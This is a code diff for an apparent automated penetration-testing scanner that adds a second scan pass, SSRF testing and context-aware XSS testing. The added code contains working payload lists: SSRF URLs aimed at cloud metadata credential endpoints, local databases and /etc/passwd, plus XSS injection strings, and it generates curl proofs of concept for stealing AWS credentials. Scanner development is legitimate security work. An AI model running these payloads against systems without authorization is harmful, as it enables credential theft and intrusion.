@@ -2,18 +2,15 @@ import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 /**
- * OmniSec™ Autonomous VAPT Engine v11.0 — XBOW Legend-Grade
+ * OmniSec™ Autonomous VAPT Engine v12.0 — Multi-Pass XBOW Legend-Grade
  * 
- * Key upgrades from v10:
- * - 3-level recursive crawling + JS endpoint mining (regex API routes from .js files)
- * - ALL params from ALL discovered pages tested (not just common names)
- * - POST body injection for every form, not just GET
- * - Header injection testing (Host, X-Forwarded-For, Referer)
- * - Expanded phase budgets (300s max, smarter allocation)
- * - HackerOne hacktivity pattern learning
- * - Auto CVE correlation with extracted tech versions
- * - Full exploitation proof in POC (actual request/response captured)
- * - Smarter time-based SQLi with statistical timing analysis
+ * v12 upgrades:
+ * - MULTI-PASS: Pass 1 (discovery+testing ~140s) + Pass 2 (validation+CVE+POC ~140s)
+ * - Context-aware XSS with HTML context analysis
+ * - Enhanced SSRF response body analysis for cloud metadata
+ * - Deeper JS param extraction
+ * - Auto threat-intel at scan start
+ * - Pass 2 receives pass 1 findings for deeper validation + exploit + POC
  */
 
 const corsHeaders = {
@@ -131,7 +128,12 @@ serve(async (req) => {
     const supabase = createClient(supabaseUrl, supabaseKey);
 
     const body = await req.json();
-    const { target, maxDepth = 3, enableLearning = true, generatePOC = true } = body;
+    const { target, maxDepth = 3, enableLearning = true, generatePOC = true, pass = 1 } = body;
+
+    // ═══ PASS 2: CONTINUATION — receives findings from pass 1 for deep validation ═══
+    if (pass === 2 && body.action === "continue_scan") {
+      return await handlePass2(body, supabase, user, LOVABLE_API_KEY);
+    }
 
     if (!target) {
       return new Response(JSON.stringify({ error: "Target is required" }),
@@ -486,13 +488,20 @@ serve(async (req) => {
       await emitAIThought(`Legend-Grade scan complete! ${findings.length} exploit-validated findings. ${findings.filter(f => f.exploitValidated).length} deterministically confirmed.`, 'complete', TOTAL_PHASES);
       await emitProgress('complete', TOTAL_PHASES, 100, `Scan complete! ${findings.length} exploit-validated findings.`);
 
+      // In multi-pass mode (pass=1), return partial findings for pass 2
+      const isPass1 = (pass === 1);
       return new Response(JSON.stringify({
         success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
+        scanId,
         discovery: {
           endpoints: discoveredEndpoints.length, subdomains: subdomains.length,
-          forms: discoveryResults.forms?.length || 0, apis: discoveryResults.apiEndpoints?.length || 0, ports: openPorts
+          forms: discoveryResults.forms?.length || 0, apis: discoveryResults.apiEndpoints?.length || 0, ports: openPorts,
+          endpointsList: discoveredEndpoints.slice(0, 150),
+          formsList: discoveryResults.forms?.slice(0, 50) || [],
+          paramsList: discoveryResults.params?.slice(0, 200) || [],
         },
         fingerprint, findings: verifiedFindings,
+        partialFindings: isPass1 ? verifiedFindings : undefined,
         attackPaths: correlationResult.attackPaths, chainedExploits: correlationResult.chainedExploits,
         summary: severityCounts, recommendations: correlationResult.recommendations,
         learningApplied: enableLearning, subdomains, targetTree, latestCVEs: latestCVEs.slice(0, 20),
@@ -2445,13 +2454,336 @@ async function detectWAF(target: URL): Promise<{ detected: boolean; name: string
 
 
 // ═══════════════════════════════════════════════════════════════════════════════
+// PASS 2 HANDLER — Deep Validation + CVE Exploit + POC + Learning
+// Runs as a separate invocation with ~140s budget
+// ═══════════════════════════════════════════════════════════════════════════════
+async function handlePass2(body: any, supabase: any, user: any, apiKey: string | undefined): Promise<Response> {
+  const scanStart = Date.now();
+  const {
+    target, scanId: existingScanId,
+    partialFindings = [], discoveredEndpoints = [], discoveredSubdomains = [],
+    detectedTech = [], openPorts = [], fingerprint = {},
+    forms = [], params = [], enableLearning = true, generatePOC = true,
+  } = body;
+
+  let targetUrl: URL;
+  try { targetUrl = new URL(target.startsWith('http') ? target : `https://${target}`); } catch {
+    return new Response(JSON.stringify({ error: "Invalid target" }), { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
+  }
+
+  const scanId = existingScanId || crypto.randomUUID();
+  const allFindings: Finding[] = [...partialFindings];
+
+  const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
+    try {
+      await supabase.from('scan_progress').insert({
+        scan_id: scanId, phase, phase_number: phaseNumber, total_phases: TOTAL_PHASES, progress, message,
+        findings_so_far: extra.findings ?? allFindings.filter((f: Finding) => !f.falsePositive).length,
+        endpoints_discovered: extra.endpoints ?? discoveredEndpoints.length,
+        current_endpoint: extra.currentEndpoint || null,
+      });
+    } catch {}
+  };
+
+  try {
+    // ═══ P2-PHASE 1: Additional SSRF deep testing with response analysis ═══
+    await emitProgress('injection', 12, 65, 'Pass 2: Deep SSRF response analysis...');
+    const ssrfFindings = await deepSSRFTest(targetUrl, params, scanStart);
+    allFindings.push(...ssrfFindings);
+
+    // ═══ P2-PHASE 2: Context-aware XSS on discovered endpoints ═══
+    await emitProgress('injection', 13, 70, 'Pass 2: Context-aware XSS testing...');
+    const ctxXssFindings = await contextAwareXSS(targetUrl, discoveredEndpoints.slice(0, 30), params, scanStart);
+    allFindings.push(...ctxXssFindings);
+
+    // ═══ P2-PHASE 3: Additional CVE testing with NVD latest ═══
+    await emitProgress('cve_exploit', 14, 75, `Pass 2: Extended CVE testing on ${detectedTech.length} technologies...`);
+    const latestCVEs = await fetchLatestCVEs(detectedTech.filter((t: string) => !t.startsWith('WAF:')), fingerprint.server);
+    const cveFindings = await testCVEExploits(targetUrl, latestCVEs, detectedTech, apiKey, scanStart, scanStart);
+    allFindings.push(...cveFindings);
+
+    // ═══ P2-PHASE 4: AI False Positive Filter (full budget now) ═══
+    await emitProgress('correlation', 15, 80, `Pass 2: AI analyzing ${allFindings.length} findings...`);
+    const dedupFindings = deduplicateFindings(allFindings);
+    const verified = await aiFalsePositiveFilter(dedupFindings, apiKey, fingerprint);
+    await emitProgress('correlation', 15, 83, `AI filter: ${verified.length} confirmed from ${dedupFindings.length}`);
+
+    // ═══ P2-PHASE 5: Deterministic Exploit Validation (full budget) ═══
+    await emitProgress('exploit_validation', 16, 85, `Pass 2: Exploit validation on ${verified.filter((f: Finding) => ['critical', 'high'].includes(f.severity)).length} findings...`);
+    const exploitValidated = await deterministicExploitValidation(verified, targetUrl, scanStart, scanStart);
+
+    // ═══ P2-PHASE 6: POC Generation (full budget) ═══
+    const critHighFindings = exploitValidated.filter((f: Finding) => f.severity === 'critical' || f.severity === 'high');
+    await emitProgress('poc', 17, 90, `Pass 2: Generating POC for ${critHighFindings.length} critical/high findings...`);
+    const findingsWithPOC = generatePOC ? await generateAIExploitPOC(critHighFindings, fingerprint, apiKey) : critHighFindings;
+    const verifiedFindings = [...findingsWithPOC, ...exploitValidated.filter((f: Finding) => f.severity !== 'critical' && f.severity !== 'high')];
+
+    // ═══ P2-PHASE 7: AI Correlation + Attack Chain Analysis ═══
+    await emitProgress('correlation', 18, 94, 'Pass 2: Attack path correlation...');
+    const correlationResult = await performAICorrelation(verifiedFindings, { forms, params, apiEndpoints: [] }, fingerprint, apiKey);
+
+    // ═══ P2-PHASE 8: Learning + Finalize ═══
+    await emitProgress('learning', 19, 97, 'Pass 2: Persisting learning data...');
+    if (enableLearning) await saveLearningData(supabase, targetUrl.hostname, verifiedFindings, user.id);
+
+    const severityCounts = {
+      critical: verifiedFindings.filter((f: Finding) => f.severity === 'critical').length,
+      high: verifiedFindings.filter((f: Finding) => f.severity === 'high').length,
+      medium: verifiedFindings.filter((f: Finding) => f.severity === 'medium').length,
+      low: verifiedFindings.filter((f: Finding) => f.severity === 'low').length,
+      info: verifiedFindings.filter((f: Finding) => f.severity === 'info').length,
+    };
+
+    // Save final results
+    const trimmedFindings = verifiedFindings.map((f: Finding) => ({
+      ...f, evidence: f.evidence?.slice(0, 500), evidence2: f.evidence2?.slice(0, 500),
+      response: f.response?.slice(0, 300), poc: f.poc?.slice(0, 2000), exploitCode: f.exploitCode?.slice(0, 1500),
+    }));
+
+    try {
+      await supabase.from('scan_history').insert({
+        module: 'autonomous_vapt', scan_type: 'Autonomous VAPT v12 - Multi-Pass XBOW',
+        target: targetUrl.toString(), status: 'completed', findings_count: verifiedFindings.length,
+        duration_ms: Date.now() - scanStart,
+        report: { findings: trimmedFindings.slice(0, 60), openPorts, detectedTech, subdomains: discoveredSubdomains }
+      });
+      await supabase.from('security_reports').insert({
+        module: 'autonomous_vapt',
+        title: `XBOW VAPT v12 Multi-Pass - ${targetUrl.hostname}`,
+        summary: `${verifiedFindings.length} exploit-validated: ${severityCounts.critical}C ${severityCounts.high}H ${severityCounts.medium}M`,
+        findings: trimmedFindings, severity_counts: severityCounts, recommendations: correlationResult.recommendations || []
+      });
+    } catch (e) { console.error('P2 DB save:', e); }
+
+    await emitProgress('complete', TOTAL_PHASES, 100, `Multi-pass scan complete! ${verifiedFindings.length} exploit-validated findings.`);
+
+    return new Response(JSON.stringify({
+      success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
+      scanId,
+      discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: forms.length, apis: 0, ports: openPorts },
+      fingerprint, findings: verifiedFindings,
+      attackPaths: correlationResult.attackPaths || [], chainedExploits: correlationResult.chainedExploits || [],
+      summary: severityCounts, recommendations: correlationResult.recommendations || [],
+      learningApplied: enableLearning, subdomains: discoveredSubdomains,
+      openPorts, detectedTech, latestCVEs: latestCVEs.slice(0, 20),
+    }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+  } catch (e: any) {
+    console.error('Pass 2 error:', e);
+    // Save whatever we have
+    const findings = deduplicateFindings(allFindings);
+    try {
+      await supabase.from('scan_history').insert({
+        module: 'autonomous_vapt', scan_type: 'Autonomous VAPT v12 (P2-partial)',
+        target: targetUrl.toString(), status: 'completed', findings_count: findings.length,
+        duration_ms: Date.now() - scanStart,
+        report: { findings: findings.slice(0, 60).map((f: Finding) => ({ ...f, evidence: f.evidence?.slice(0, 500), poc: f.poc?.slice(0, 2000) })) }
+      });
+    } catch {}
+    await emitProgress('complete', TOTAL_PHASES, 100, `Pass 2 complete (partial). ${findings.length} findings.`);
+    return new Response(JSON.stringify({
+      success: true, target: targetUrl.toString(), findings, scanTime: Date.now() - scanStart,
+      summary: {
+        critical: findings.filter((f: Finding) => f.severity === 'critical').length,
+        high: findings.filter((f: Finding) => f.severity === 'high').length,
+        medium: findings.filter((f: Finding) => f.severity === 'medium').length,
+        low: findings.filter((f: Finding) => f.severity === 'low').length,
+        info: findings.filter((f: Finding) => f.severity === 'info').length,
+      },
+      discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: 0, apis: 0 },
+      fingerprint: {}, attackPaths: [], chainedExploits: [], recommendations: [],
+      openPorts, detectedTech, subdomains: discoveredSubdomains,
+    }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// DEEP SSRF TESTING WITH RESPONSE ANALYSIS (New in v12)
+// ═══════════════════════════════════════════════════════════════════════════════
+async function deepSSRFTest(target: URL, params: string[], scanStart: number): Promise<Finding[]> {
+  const findings: Finding[] = [];
+  const ssrfParams = [...new Set([...params, 'url', 'uri', 'redirect', 'callback', 'next', 'dest', 'target',
+    'feed', 'host', 'site', 'html', 'path', 'load', 'link', 'src', 'ref', 'proxy', 'endpoint', 'fetch'])];
+  
+  const ssrfPayloads = [
+    { payload: 'http://169.254.169.254/latest/meta-data/', indicators: ['ami-id', 'instance-id', 'iam', 'security-credentials', 'public-ipv4'] },
+    { payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', indicators: ['AccessKeyId', 'SecretAccessKey', 'Token'] },
+    { payload: 'http://metadata.google.internal/computeMetadata/v1/', indicators: ['project-id', 'zone', 'instance', 'attributes'] },
+    { payload: 'http://169.254.169.254/metadata/v1/', indicators: ['id', 'hostname', 'region'] },
+    { payload: 'http://127.0.0.1:6379/', indicators: ['redis_version', 'connected_clients', 'DENIED'] },
+    { payload: 'http://127.0.0.1:9200/', indicators: ['elasticsearch', 'cluster_name', 'version'] },
+    { payload: 'http://127.0.0.1:27017/', indicators: ['mongodb', 'ismaster'] },
+    { payload: 'file:///etc/passwd', indicators: ['root:x:0:0', '/bin/bash', '/bin/sh'] },
+    { payload: 'file:///etc/hostname', indicators: [] },
+    { payload: 'http://[::1]/', indicators: [] },
+    { payload: 'http://0x7f000001/', indicators: [] },
+    { payload: 'http://0177.0.0.1/', indicators: [] },
+  ];
+
+  for (const param of ssrfParams.slice(0, 20)) {
+    if ((Date.now() - scanStart) > 120000) break;
+    for (const { payload, indicators } of ssrfPayloads.slice(0, 6)) {
+      try {
+        const testUrl = new URL(target.toString());
+        testUrl.searchParams.set(param, payload);
+        const resp = await fetchWithTimeout(testUrl.toString(), 6000);
+        const body = await resp.text();
+        
+        // Check for cloud metadata indicators in response
+        const matchedIndicators = indicators.filter(ind => body.toLowerCase().includes(ind.toLowerCase()));
+        if (matchedIndicators.length > 0) {
+          findings.push({
+            id: `SSRF-${Date.now()}-${param}`, severity: 'critical',
+            title: `SSRF in "${param}" — Cloud Metadata Exposed [EXPLOIT-VALIDATED]`,
+            description: `Server fetched internal resource. Metadata indicators: ${matchedIndicators.join(', ')}`,
+            endpoint: testUrl.toString(), method: 'GET', payload, owasp: 'A10:2021',
+            evidence: `Response contains: ${matchedIndicators.join(', ')}`,
+            evidence2: `Body excerpt: ${body.slice(0, 200)}`,
+            dualConfirmed: true, exploitValidated: true,
+            remediation: 'Block internal IP ranges. Validate URL scheme and destination.',
+            cwe: 'CWE-918', cvss: 9.8, mitre: ['T1190', 'T1552'],
+            confidence: 97, category: 'ssrf',
+            poc: `# SSRF POC — Cloud Metadata Access\ncurl -s "${testUrl.toString()}" | head -30\n\n# Impact: AWS credentials can be stolen via:\ncurl -s "${target.toString()}?${param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`
+          });
+          break;
+        }
+
+        // Check for response differences suggesting SSRF (blind)
+        if (resp.status === 200 && body.length > 50 && !body.includes('<!DOCTYPE') && !body.includes('<html')) {
+          const normalUrl = new URL(target.toString());
+          normalUrl.searchParams.set(param, 'https://example.com');
+          const normalResp = await fetchWithTimeout(normalUrl.toString(), 5000);
+          const normalBody = await normalResp.text();
+          if (Math.abs(body.length - normalBody.length) > 200 || body !== normalBody) {
+            findings.push({
+              id: `SSRF-BLIND-${Date.now()}-${param}`, severity: 'high',
+              title: `Potential Blind SSRF in "${param}"`,
+              description: `Different response for internal URL vs external. Possible blind SSRF.`,
+              endpoint: testUrl.toString(), method: 'GET', payload, owasp: 'A10:2021',
+              evidence: `Internal payload response: ${body.length}b`,
+              evidence2: `External response: ${normalBody.length}b (Δ=${Math.abs(body.length - normalBody.length)}b)`,
+              dualConfirmed: false,
+              remediation: 'Implement URL allowlist. Block RFC1918 ranges.',
+              cwe: 'CWE-918', cvss: 7.5,
+              confidence: 65, category: 'ssrf',
+            });
+          }
+        }
+      } catch {}
+    }
+  }
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// CONTEXT-AWARE XSS (New in v12)
+// Analyzes where input is reflected (attribute, tag, script) and uses targeted payloads
+// ═══════════════════════════════════════════════════════════════════════════════
+async function contextAwareXSS(target: URL, endpoints: string[], params: string[], scanStart: number): Promise<Finding[]> {
+  const findings: Finding[] = [];
+  const canary = 'xb0w' + Math.random().toString(36).slice(2, 6);
+  
+  const contextPayloads: Record<string, string[]> = {
+    attribute: [
+      `" onfocus=alert(1) autofocus="`, `' onfocus=alert(1) autofocus='`,
+      `" onmouseover=alert(1) "`, `"><img src=x onerror=alert(1)>`,
+      `" style="background:url(javascript:alert(1))"`,
+    ],
+    tag: [
+      `<img src=x onerror=alert(1)>`, `<svg/onload=alert(1)>`,
+      `<details open ontoggle=alert(1)>`, `<body onload=alert(1)>`,
+      `<iframe src="javascript:alert(1)">`, `<marquee onstart=alert(1)>`,
+    ],
+    script: [
+      `';alert(1)//`, `";alert(1)//`, `</script><script>alert(1)</script>`,
+      `-alert(1)-`, `\`;alert(1)//`, `'+alert(1)+'`,
+    ],
+    url: [
+      `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`,
+      `javascript:alert(document.domain)//`,
+    ],
+  };
+
+  const testParams = [...new Set([...params, 'q', 'search', 'name', 'id', 'input', 'text', 'msg', 'comment', 'value'])];
+
+  for (const ep of endpoints.slice(0, 15)) {
+    if ((Date.now() - scanStart) > 120000) break;
+    
+    for (const param of testParams.slice(0, 10)) {
+      if ((Date.now() - scanStart) > 120000) break;
+      
+      // Step 1: Inject canary to find reflection context
+      try {
+        const canaryUrl = new URL(ep);
+        canaryUrl.searchParams.set(param, canary);
+        const resp = await fetchWithTimeout(canaryUrl.toString(), 5000);
+        const body = await resp.text();
+        
+        if (!body.includes(canary)) continue;
+        
+        // Determine context
+        const idx = body.indexOf(canary);
+        const before = body.slice(Math.max(0, idx - 80), idx);
+        const after = body.slice(idx + canary.length, idx + canary.length + 40);
+        
+        let context = 'tag'; // default
+        if (before.match(/=["'][^"']*$/)) context = 'attribute';
+        else if (before.match(/<script[^>]*>[^<]*$/i)) context = 'script';
+        else if (before.match(/(?:href|src|action)\s*=\s*["']?$/i)) context = 'url';
+        
+        // Step 2: Use context-specific payloads
+        const payloads = contextPayloads[context] || contextPayloads.tag;
+        for (const payload of payloads.slice(0, 3)) {
+          try {
+            const xssUrl = new URL(ep);
+            xssUrl.searchParams.set(param, payload);
+            const xssResp = await fetchWithTimeout(xssUrl.toString(), 5000);
+            const xssBody = await xssResp.text();
+            
+            // Check if payload is reflected unescaped
+            if (xssBody.includes(payload) || 
+                (context === 'attribute' && xssBody.includes('onfocus=') && !body.includes('onfocus=')) ||
+                (context === 'tag' && xssBody.includes('onerror=') && !body.includes('onerror=')) ||
+                (context === 'script' && xssBody.includes('alert(1)') && !body.includes('alert(1)'))) {
+              
+              // Dual-confirm with second payload
+              const payload2 = payloads[payloads.indexOf(payload) + 1] || payloads[0];
+              const xss2Url = new URL(ep);
+              xss2Url.searchParams.set(param, payload2);
+              const xss2Resp = await fetchWithTimeout(xss2Url.toString(), 5000);
+              const xss2Body = await xss2Resp.text();
+              const dualConfirmed = xss2Body.includes(payload2);
+
+              findings.push({
+                id: `CTX-XSS-${Date.now()}-${param}`, severity: 'high',
+                title: `Context-Aware XSS in "${param}" [${context.toUpperCase()} context]${dualConfirmed ? ' [DUAL-CONFIRMED]' : ''}`,
+                description: `Payload reflected in ${context} context without sanitization. ${dualConfirmed ? 'Dual-confirmed with 2 payloads.' : ''}`,
+                endpoint: xssUrl.toString(), method: 'GET', payload, owasp: 'A03:2021',
+                evidence: `Context: ${context} | Before: "${before.slice(-30)}" | After: "${after.slice(0, 20)}"`,
+                evidence2: dualConfirmed ? `2nd payload "${payload2}" also reflected` : `Canary "${canary}" reflects at position ${idx}`,
+                dualConfirmed, exploitValidated: true,
+                remediation: context === 'attribute' ? 'HTML-encode attribute values' : context === 'script' ? 'Never embed user input in script blocks' : 'Apply context-aware output encoding + CSP',
+                cwe: 'CWE-79', cvss: 6.1, mitre: ['T1059.007'],
+                confidence: dualConfirmed ? 95 : 82, category: 'xss',
+                poc: `# Context-Aware XSS POC (${context} context)\n# Step 1: Inject canary to locate reflection\ncurl -s "${canaryUrl.toString()}" | grep -n "${canary}"\n\n# Step 2: Exploit with context-specific payload\ncurl -s "${xssUrl.toString()}" | grep -i "alert\\|onerror\\|onfocus"\n\n# Step 3: Browser verification\n# Open: ${xssUrl.toString()}\n# Expected: JavaScript alert() fires`
+              });
+              break; // found XSS for this param
+            }
+          } catch {}
+        }
+      } catch {}
+    }
+  }
+  return findings;
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
 async function fetchWithTimeout(url: string, timeout: number, options?: RequestInit): Promise<Response> {
   const controller = new AbortController();
   const tid = setTimeout(() => controller.abort(), timeout);
   try {
     const response = await fetch(url, {
       ...options, signal: controller.signal,
-      headers: { "User-Agent": "OmniSec XBOW VAPT/11.0", ...(options?.headers || {}) }
+      headers: { "User-Agent": "OmniSec XBOW VAPT/12.0", ...(options?.headers || {}) }
     });
     clearTimeout(tid);
     return response;
